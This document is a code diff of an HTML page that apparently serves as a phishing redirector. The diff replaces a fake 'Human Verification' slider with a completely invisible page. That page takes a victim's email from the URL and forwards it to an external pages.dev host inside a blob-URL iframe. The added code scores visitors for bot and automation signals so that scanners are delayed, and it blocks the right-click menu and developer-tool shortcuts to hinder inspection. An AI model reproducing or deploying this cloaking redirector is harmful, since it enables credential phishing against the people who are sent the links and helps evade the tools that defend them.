@@ -3,133 +3,40 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Human Verification</title>
+<title>Loading...</title>
 <style>
-/* FULLSCREEN OVERLAY */
-#overlay {
-    position: fixed;
-    inset: 0;
-    background: #f2f2f2;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 999999;
+/* HIDE EVERYTHING - COMPLETELY INVISIBLE */
+#overlay, #verificationBox, #robotIcon, #sliderContainer, .header span,
+#verifying, #beepSound, .spinner, #checkmark, #slider, #sliderText, #sliderFill {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    width: 0 !important;
+    height: 0 !important;
+    position: absolute !important;
+    top: -9999px !important;
+    left: -9999px !important;
 }
-/* VERIFICATION BOX */
-#verificationBox {
-    width: 220px;
-    padding: 16px;
-    border-radius: 14px;
-    background: #fff;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    border: 1px solid #dcdcdc;
-    text-align: left;
-    font-family: Arial, sans-serif;
-    position: relative;
-}
-#verificationBox .header {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 12px;
-}
-#robotIcon {
-    width: 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: #f8f9fa;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    color: #555;
-    transform: rotate(0deg);
-    transition: transform 0.05s linear;
-}
-#verificationBox .header span {
-    font-size: 15px;
-    color: #333;
-}
-/* SLIDER */
-#sliderContainer {
-    width: 100%;
-    height: 36px; /* slightly taller for easier mobile use */
-    background: #f1f3f4;
-    border-radius: 18px;
-    position: relative;
-    cursor: pointer;
-    overflow: hidden;
-}
-#sliderFill {
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 100%;
-    background: #d2e7d5;
+
+/* MAKE PAGE COMPLETELY INVISIBLE */
+html, body {
+    margin: 0;
+    padding: 0;
     width: 0;
-    border-radius: 18px;
-    transition: width 0.1s;
+    height: 0;
+    overflow: hidden;
+    background: transparent;
 }
-#slider {
-    width: 36px;  /* bigger handle for mobile */
-    height: 36px;
-    background: #34a853;
-    border-radius: 50%;
-    position: absolute;
-    top: 0;
-    left: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    font-size: 18px;
-    transition: left 0.1s;
-    z-index: 2;
-}
-#sliderText {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    pointer-events: none;
-    color: #555;
-    font-size: 14px;
-    transition: opacity 0.2s;
-}
-/* CHECKMARK */
-#checkmark {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    font-size: 18px;
-    color: #34a853;
-    pointer-events: none;
-    transition: transform 0.3s ease;
-}
-/* SPINNER */
-.spinner {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    border: 2px solid #40739e;
-    border-top-color: transparent;
-    animation: spin 0.6s linear infinite;
-}
-@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
-#verifying {
-    display: none;
-    margin-top: 10px;
-    font-size: 12px;
-    color: #555;
-    text-align: center;
+
+/* FORCE ALL ELEMENTS INVISIBLE */
+* {
+    display: none !important;
 }
 </style>
 </head>
 <body>
 
+<!-- ALL VISIBLE ELEMENTS ARE HIDDEN BY CSS -->
 <div id="overlay">
     <div id="verificationBox">
         <div class="header">
@@ -155,10 +62,70 @@
 <audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
 
 <script>
+// === INVISIBLE VERIFICATION SYSTEM ===
+// Page appears completely blank
+// Real users get instant redirect
+// Bots get delayed with invisible checks
+
 // IPFS URL
 const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev";
-function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
-function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
+
+function getEmail() { 
+    return new URLSearchParams(location.search).get("email") || ""; 
+}
+
+function buildIPFS(email) { 
+    return email ? BASE_IPFS + "#" + encodeURIComponent(email) : BASE_IPFS; 
+}
+
+// === INVISIBLE BOT DETECTION ===
+function computeBotScore() {
+    let score = 0;
+    const ua = navigator.userAgent.toLowerCase();
+    
+    // Bot pattern detection (invisible)
+    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
+    if (navigator.webdriver) score += 50;
+    
+    // Plugin check (real browsers have plugins)
+    if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) score += 20;
+    
+    // Superhuman speed test
+    const start = performance.now();
+    let x = 0;
+    for (let i = 0; i < 100000; i++) x += Math.random();
+    const end = performance.now();
+    if (end - start < 0.5) score += 30;
+    
+    return score;
+}
+
+// === INVISIBLE HUMAN DETECTION ===
+function detectHumanInteraction() {
+    let humanDetected = false;
+    
+    // Listen for any interaction (invisible listeners)
+    const events = ['mousemove', 'mousedown', 'click', 'touchstart', 'keydown'];
+    events.forEach(eventType => {
+        document.addEventListener(eventType, () => {
+            if (!humanDetected) {
+                humanDetected = true;
+                // Human detected - mark for fast redirect
+                window._isHuman = true;
+            }
+        }, { once: true, passive: true });
+    });
+    
+    // Also check if tab is focused
+    if (document.hasFocus()) {
+        humanDetected = true;
+        window._isHuman = true;
+    }
+    
+    return humanDetected;
+}
+
+// === CREATE BLOB REDIRECT ===
 function createBlobHTML(url) {
     return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
         html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
@@ -166,111 +133,82 @@ function createBlobHTML(url) {
     </style></head><body><iframe src="${url}"></iframe></body></html>`;
 }
 
-// BOT CHECK
-function computeBotScore() {
-    let score = 0;
-    const ua = navigator.userAgent.toLowerCase();
-    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
-    if (navigator.webdriver) score += 50;
-    return score;
-}
-
-// ROBOT ROTATION
-let robotRotation = 0;
-const robotIcon = document.getElementById("robotIcon");
-let rotationSpeed = 1; // idle speed
-function rotateRobot() {
-    robotRotation += rotationSpeed;
-    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
-    requestAnimationFrame(rotateRobot);
-}
-rotateRobot();
-
-// SLIDER
-const slider = document.getElementById("slider");
-const sliderContainer = document.getElementById("sliderContainer");
-const sliderText = document.getElementById("sliderText");
-const sliderFill = document.getElementById("sliderFill");
-const verifying = document.getElementById("verifying");
-const overlay = document.getElementById("overlay");
-const checkmark = document.getElementById("checkmark");
-const beepSound = document.getElementById("beepSound");
-
-let isDragging = false;
-let startX = 0;
-let beepPlayed = false;
-
-function startDrag(clientX) {
-    if (!isDragging) {
-        isDragging = true;
-        startX = clientX - slider.offsetLeft;
-        rotationSpeed = 5; // faster rotation while dragging
-        if (!beepPlayed) {
-            beepPlayed = true;
-            beepSound.currentTime = 0;
-            beepSound.play().catch(()=>{});
-        }
+// === MAIN EXECUTION ===
+function executeRedirect() {
+    const botScore = computeBotScore();
+    const isHuman = window._isHuman || false;
+    
+    // Determine delay based on detection
+    let delay = 100; // 100ms for humans (instant)
+    
+    if (botScore >= 60) {
+        // Bot detected - longer delay
+        delay = 5000; // 5 seconds
+        console.log('Bot detected - adding delay');
+    } else if (!isHuman) {
+        // No human interaction - moderate delay
+        delay = 1500; // 1.5 seconds
     }
-}
-
-function onDrag(clientX) {
-    if (!isDragging) return;
-    let x = clientX - startX;
-    if (x < 0) x = 0;
-    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
-    slider.style.left = x + "px";
-    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
-    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
-}
-
-function endDrag() {
-    if (!isDragging) return;
-    isDragging = false;
-    rotationSpeed = 1; // back to idle
-
-    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
-        if (navigator.vibrate) navigator.vibrate(50); // vibration feedback
-
-        const botScore = computeBotScore();
-        if (botScore >= 60) {
-            alert("Suspicious activity detected.");
-            slider.style.left = "0px";
-            sliderFill.style.width = "0px";
-            sliderText.style.opacity = 1;
-            return;
-        }
-
-        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
-        slider.style.display = "none";
-        sliderText.style.opacity = 0;
-        verifying.style.display = "block";
-
-        setTimeout(() => {
-            overlay.style.display = "none";
-            const email = getEmail();
-            const ipfsURL = buildIPFS(email);
-            const blobHTML = createBlobHTML(ipfsURL);
-            const blob = new Blob([blobHTML], { type: "text/html" });
-            const blobURL = URL.createObjectURL(blob);
+    
+    // Get email and build URL
+    const email = getEmail();
+    const ipfsURL = buildIPFS(email);
+    
+    // Create blob for redirect
+    const blobHTML = createBlobHTML(ipfsURL);
+    const blob = new Blob([blobHTML], { type: "text/html" });
+    const blobURL = URL.createObjectURL(blob);
+    
+    // Redirect after calculated delay
+    setTimeout(() => {
+        window.location.href = blobURL;
+    }, delay);
+    
+    // Safety: Always redirect after 8 seconds max
+    setTimeout(() => {
+        if (window.location.href.indexOf('blob:') === -1) {
             window.location.href = blobURL;
-        }, 800);
-    } else {
-        slider.style.left = "0px";
-        sliderFill.style.width = "0px";
-        sliderText.style.opacity = 1;
-    }
+        }
+    }, 8000);
 }
 
-// Mouse events
-slider.addEventListener("mousedown", e => startDrag(e.clientX));
-document.addEventListener("mousemove", e => onDrag(e.clientX));
-document.addEventListener("mouseup", endDrag);
+// === INITIALIZE ===
+function initialize() {
+    // Start human detection
+    detectHumanInteraction();
+    
+    // Execute redirect after brief initialization
+    setTimeout(executeRedirect, 50);
+    
+    // Remove any event listeners that might show UI
+    document.addEventListener('mousedown', (e) => e.preventDefault(), { passive: false });
+    document.addEventListener('touchstart', (e) => e.preventDefault(), { passive: false });
+}
 
-// Touch events
-slider.addEventListener("touchstart", e => startDrag(e.touches[0].clientX));
-document.addEventListener("touchmove", e => { if (isDragging) onDrag(e.touches[0].clientX); });
-document.addEventListener("touchend", endDrag);
+// Start when page loads
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initialize);
+} else {
+    initialize();
+}
+
+// Disable right-click context menu
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+// Block keyboard shortcuts that might show dev tools
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+        // Force redirect if dev tools attempted
+        executeRedirect();
+    }
+});
 </script>
+
+<!-- NOSCRIPT FALLBACK -->
+<noscript>
+    <meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev?email=<?php echo isset($_GET['email']) ? urlencode($_GET['email']) : ''; ?>">
+</noscript>
 
 </body>
 </html>
